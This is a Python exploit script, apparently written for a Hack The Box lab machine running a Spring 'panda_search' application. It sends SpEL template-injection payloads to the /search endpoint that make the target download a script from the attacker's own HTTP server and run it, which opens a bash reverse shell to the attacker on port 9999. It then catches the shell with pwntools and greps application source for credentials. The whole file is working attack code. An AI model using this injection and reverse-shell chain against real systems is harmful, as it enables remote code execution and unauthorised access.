import requests
import os, time
import threading
import socketserver
from pwn import *
from http.server import HTTPServer, SimpleHTTPRequestHandler

# os.popen is used to not printing the command and store it in a variable 
# strip() removes newline
ip = os.popen("ifconfig | grep -A 1 tun0 | grep -E 'inet|netmask' | awk '{print $2}'").read().strip()
lhost = "0.0.0.0"
lport = 8000


class ThreadedHTTPServer(object):
    # This class runs SimpleHTTPServer and lets you start and stop an instance of it.

    def __init__(self, host, port, request_handler=SimpleHTTPRequestHandler):
        # Starts HTTP server using a thread and a handler.
        socketserver.TCPServer.allow_reuse_address = True
        self.server = socketserver.TCPServer((host, int(port)), request_handler)
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True
        self.server_thread.start()

    def stop(self):
        # Stops the HTTP server
        self.server.shutdown()
        self.server.server_close()

def uploadShell():    
    # Creates a session
    s = requests.session()

    # Starts the HTTP server daemon giving a host and a port
    httpd = ThreadedHTTPServer(lhost, lport)    
    print(f"Starting HTTP Server at port {lport}...")
    
    # Write the file containing the shell
    if os.path.isdir('./shell2.sh') == False: 
        file = open('shell2.sh', 'w+')
        file.write(f"bash -i >& /dev/tcp/{ip}/9999 0>&1")
        file.close()
    
    # Send a POST request with the payload to make a request to the web server to tranfer shell2.sh
    post_data = {'name': f'*{{T(java.lang.Runtime).getRuntime().exec("curl {ip}:8000/shell2.sh -o /tmp/shell2.sh")}}'}
    s.post('http://10.10.11.170:8080/search', data=post_data, proxies={'http':'http://127.0.0.1:8080'})
    time.sleep(0.2)

    # Stop HTTP server daemon
    httpd.stop()

    # Open port 9999 waiting for reverse shell
    l = listen(9999)    

    post_data2 = {'name': f'*{{T(java.lang.Runtime).getRuntime().exec("bash /tmp/shell2.sh")}}'}
    s.post('http://10.10.11.170:8080/search', data=post_data2, proxies={'http':'http://127.0.0.1:8080'})
    time.sleep(0.2)
    
    l.sendline(b"cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java | grep localhost")
    l.interactive()


if __name__ == '__main__':
    uploadShell()    
